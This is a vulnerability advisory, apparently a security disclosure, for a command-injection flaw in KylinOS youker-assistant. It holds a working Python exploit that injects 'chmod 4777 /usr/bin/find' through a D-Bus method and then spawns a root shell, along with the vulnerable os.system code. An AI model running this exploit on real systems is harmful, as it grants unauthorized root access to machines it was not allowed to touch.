@@ -1,0 +1,49 @@
+# Kylin OS youker-assistant privilege escalation vulnerability
+
+Author: Set3r.Pan（8691003@qq.com）\
+Unit: KylinSoft（https://www.kylinos.cn/）
+## Report
+### Describe
+Youker-assistant is an integrated tool on KylinOS Desktop to help perform daily system maintenance tasks. There is a command injection vulnerability in this component, which may lead to privilege escalation for ordinary users.
+### Hazard level
+High
+### Affected version
+- Desktop：youker-assistant < 3.1.4.13
+### POC&&EXP
+ISO Download:\
+https://distro-images.kylinos.cn:8802/web_pungi/download/share/HXDYtGjZm3daA4UvOTLkiPl1nB9ErM0c/
+
+exploit.py
+```
+import os
+import time
+import dbus
+import getpass
+
+bus = dbus.SystemBus()
+
+
+interface = dbus.Interface(bus.get_object('com.kylin.assistant.systemdaemon', 
+			'/com/kylin/assistant/systemdaemon'), 
+			'com.kylin.assistant.systemdaemon')
+
+interface.adjust_cpufreq_scaling_governer ("123|chmod 4777 /usr/bin/find|")
+time.sleep(3)
+
+os.system('find /tmp -exec /bin/sh -p \;')
+```
+
+### Vuln details
+Vuln function:
+
+adjust_cpufreq_scaling_governer
+
+Vuln Type: Command Injection
+
+vuln code:
+```
+   else:
+                        cmd = 'echo %s > %s' % (value, filepath)
+                        os.system(cmd)
+```
+The value in the command executed by system comes from user input, which can be used for command injection.
